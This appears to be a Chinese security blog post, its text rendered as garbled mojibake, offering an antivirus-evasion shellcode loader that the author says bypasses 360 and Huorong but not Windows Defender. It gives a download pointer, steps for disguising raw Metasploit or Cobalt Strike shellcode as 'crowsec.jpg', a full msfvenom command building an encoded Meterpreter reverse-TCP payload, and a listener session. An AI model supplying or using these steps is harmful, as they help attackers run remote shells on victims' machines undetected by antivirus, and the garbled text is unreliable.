æ›´æ–°æ—¶é—´ï¼š2022-01-19



# ã€å·¥å…·åˆ†äº«ã€‘å…æ€360&ç«ç»’çš„shellcodeåŠ è½½å™¨

# 1. å…æ€æ•ˆæœ


è¯¥`shellcode`åŠ è½½å™¨ç›®å‰å¯ä»¥è¿‡`360&ç«ç»’`ï¼Œ`Windows Defender`æ²¡æˆã€‚ã€‚ã€‚
â€‹

ä»£ç å’Œæ€è·¯æš‚ä¸å¼€æºï¼

ä½ å¯ä»¥åœ¨æˆ‘çš„GitHubä¸Šä¸‹è½½è¯¥å·¥å…·ï¼š

å¦‚æœä½ è®¿é—®GitHubå›°éš¾ï¼Œä½ å¯ä»¥åœ¨ä¹Œé¸¦å®‰å…¨å…¬ä¼—å·åå°ç›´æ¥å›å¤å…³é”®å­—ï¼šåŠ è½½å™¨ ä¸‹è½½ï¼



æ–¹æ³•ï¼š ç”Ÿæˆ`msf`æˆ–`cs`çš„`shellcode`åŸç”Ÿæ ¼å¼ï¼Œå‘½åä¸º`crowsec.jpg`ï¼ˆè¿™ä¸ªæ˜¯å†™æ­»çš„ï¼‰ï¼Œå°†å…¶å’Œ`crowsec_shelllcodeBypass.exe`ï¼ˆè¿™ä¸ªåå­—å¯ä»¥ä¿®æ”¹çš„ï¼‰æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç›´æ¥åŒå‡»å³å¯ï¼
## 1.1 å½“å‰



| **æ€è½¯\å…æ€æ•ˆæœ** | **è™šæ‹Ÿæœºç¯å¢ƒï¼šWindows 10** | **è™šæ‹Ÿæœºç¯å¢ƒï¼šWindows 7** | **è™šæ‹Ÿæœºç¯å¢ƒï¼šWindows server 2019** | **æœ€æ–°æµ‹è¯•æ—¶é—´** |
| --- | --- | --- | --- | --- |
| è”ç½‘Windows Defenderæœ€æ–°ç‰ˆ(å…³é—­è‡ªåŠ¨å‘é€å¯ç–‘æ ·æœ¬) | âŒ | æœªæµ‹ | âŒ | 2022.01.19 |
| è”ç½‘360æœ€æ–°ç‰ˆï¼ˆå…¶å®æµ‹è¯•æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼‰ | âœ… | âœ… | âœ… | 2022.01.19 |
| è”ç½‘ç«ç»’æœ€æ–°ç‰ˆ | æœªæµ‹ | âœ… | âœ… | 2022.01.19 |



## 1.2 åŠå¹´å‰


è¿™ä¸ªæ•°æ®å·²æ²¡æœ‰æ„ä¹‰ã€‚

| **~~æ€è½¯\å…æ€æ•ˆæœ~~** | **~~è™šæ‹Ÿæœºç¯å¢ƒï¼šWindows 10~~** | **~~è™šæ‹Ÿæœºç¯å¢ƒï¼šWindows 7~~** | **~~è™šæ‹Ÿæœºç¯å¢ƒï¼šWindows server 2019~~** | **~~æœ€æ–°æµ‹è¯•æ—¶é—´~~** |
| --- | --- | --- | --- | --- |
| ~~è”ç½‘Windows Defenderæœ€æ–°ç‰ˆ(å…³é—­è‡ªåŠ¨å‘é€å¯ç–‘æ ·æœ¬)~~ | ~~âœ…~~ | ~~æœªæµ‹~~ | ~~âœ…~~ | ~~2021.06.21~~ |
| ~~è”ç½‘360æœ€æ–°ç‰ˆï¼ˆ~~~~å…¶å®æµ‹è¯•æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰~~~~ï¼‰~~ | ~~æœªæµ‹~~ | ~~æœªæµ‹~~ | ~~æœªæµ‹~~ | ~~2021.06.21~~ |
| ~~è”ç½‘ç«ç»’æœ€æ–°ç‰ˆ~~ | ~~æœªæµ‹~~ | ~~âœ…~~ | ~~âœ…~~ | ~~2021.06.21~~ |



## 2.3 è¯´æ˜


è¿™ä¸ª`shellcode`åŠ è½½å™¨å·¥å…·æ˜¯æˆ‘åœ¨`2021-06-21`å·åšçš„ï¼Œä¼˜åŒ–ä¹‹åVTæŸ¥æ€ä¸º`0/68`ï¼Œä¸€ä¸ªæœˆä¹‹åæˆ‘å†å»æ£€æŸ¥ï¼Œç”šè‡³åˆ°ç°åœ¨å»æ£€æŸ¥ï¼Œå½“å‰çš„VTæŸ¥æ€ä¾æ—§ä¸º`0/68`ã€‚
â€‹

`2021-06-21`æ˜¯èƒ½è¿‡`ç«ç»’`ã€`360`ã€`Windows Defender(å…³é—­è‡ªåŠ¨å‘é€å¯ç–‘æ ·æœ¬)`
â€‹

å‰å‡ å¤©åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°è¿‡ä¸äº†`Windows Defender`ï¼Œä»Šå¤©ç¨å¾®ä¼˜åŒ–äº†ä¸€ä¸‹ï¼Œå‘ç°è¿˜æ˜¯è¿‡ä¸äº†`Windows Defender`ï¼Œä¸»è¦åŸå› æ˜¯è¯†åˆ«äº†`msf`çš„éƒ¨åˆ†ç‰¹å¾ï¼ï¼ï¼
â€‹

é‰´äºç›®å‰å·²ç»æœ‰äº†å…¶ä»–çš„å…æ€æ–¹æ¡ˆï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå°±æŠŠå·¥å…·åˆ†äº«å‡ºæ¥ï¼ˆğŸ¶ï¼‰ï¼Œè‡³å°‘è¿˜èƒ½è¿‡`360`å’Œ`ç«ç»’`ã€‚ï¼ˆæ”¾å‡ºæ¥ä¹‹åï¼ŒåŸºæœ¬ä¸Šå‡ å°æ—¶å°±æ²¡ç”¨äº†ï¼‰ã€‚
â€‹



![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642601558210-77264d08-585e-4214-86bf-f2ac13d84d07.png)


æŸ¥è¯¢æ—¶é—´ï¼š`2022.01.19`
â€‹

![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642601641740-37271f4b-227f-42e2-aca9-8f728e283c54.png)


# 3. ä½¿ç”¨æ–¹æ³•
# 3.1. msfä¸Šçº¿


åœ¨è¿™é‡Œä½¿ç”¨msfvenonç”Ÿæˆshellcodeï¼Œä¸ºäº†å¥½ç‚¹çš„æ•ˆæœï¼Œè¿™é‡Œä½¿ç”¨`shikata_ga_nai` ç¼–ç å™¨ï¨¸å¯¹`shellcode`è¿›è¡Œæ··æ·†ç¼–ç ï¼Œç¼–ç ä¹‹åçš„`shellcode`å¹¶ä¸æ˜¯æ‰€æœ‰æ€è½¯éƒ½è¯†åˆ«ä¸å‡ºæ¥ï¼Œè¯¦æƒ…å¯ä»¥çœ‹æˆ‘ä»¥å‰çš„æ–‡ç« ï¼š
xxxx
```
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 7 -b '\x00'  lhost=10.211.55.2 lport=1234  -f raw -o crowsec.jpg
```


![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642602696391-0b17ed2f-a282-491a-a92a-1473b5213338.png)


ä½¿ç”¨msfè¿›è¡Œç›‘å¬ï¼š
â€‹

![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642604110630-14245c70-16eb-4d0b-8cd1-d7528db5e163.png)
```python
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload  windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:1234
```
### 3.1.1 360
![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642604510319-4ab109f8-01d4-484b-92fe-89972e00357b.png)
### 3.1.2 Windows Defender


è¢«æ€
![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642606086645-b320419d-f848-4b95-b272-068940bc7fe2.png)


### 3.1.3 ç«ç»’
![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642606183320-773dde9e-d3a4-4bf4-bede-a3639eeb3aa5.png)




## 3.2 Cobalt Strikeä¸Šçº¿


åœ¨è¿™é‡Œåªè¯´æ€è·¯ï¼Œèƒ½å¤Ÿè¿‡`ç«ç»’`å’Œ`360`ï¼Œä½†æ˜¯ä¸èƒ½è¿‡`Windows Defender`ï¼ŒåŒæ ·çš„é—®é¢˜ï¼šç‰¹å¾å‡ºç°åœ¨`shellcode`ä¸Šé¢ã€‚


![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333743849-3faa3f92-b9be-4d13-8639-4ef47d31d91e.png)


![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333663432-aeef544c-00f5-46d0-afa5-be8eac02cbaf.png)
å°†æ–‡ä»¶ä¿å­˜ä¸º`crowsec.jpg`ï¼ˆä¸‹å›¾æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œä¸»è¦æ˜¯å¤ªç´¯äº†ï¼Œä¸æƒ³æ¢äº†ã€‚ã€‚ã€‚ï¼‰
![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333734629-94ba4bc1-8893-4882-a850-8e546fb212c4.png)
ç°å°†ç”Ÿæˆçš„binæ–‡ä»¶ä¿®æ”¹ä¸ºpngæ–‡ä»¶ï¼Œç„¶ååŒå‡»ä¸Šçº¿æ“ä½œ


![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333800699-980bd71e-f2ff-4383-b14e-7453e21db605.png)


ä½†æ˜¯è¿™é‡Œå¯ä»¥å‘ç°ï¼Œå½“å‰çš„`payload`å·²ç»è¢«æ ‡è®°ç‰¹å¾ï¼Œç›´æ¥è¢«æ€ï¼Œä½†æ˜¯å…æ€`360`å’Œ`ç«ç»’`æ˜¯ä¸å½±å“çš„ã€‚
![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333824066-d215bf3b-bff0-413e-9791-8ed69dcecafe.png)
â€‹

# 

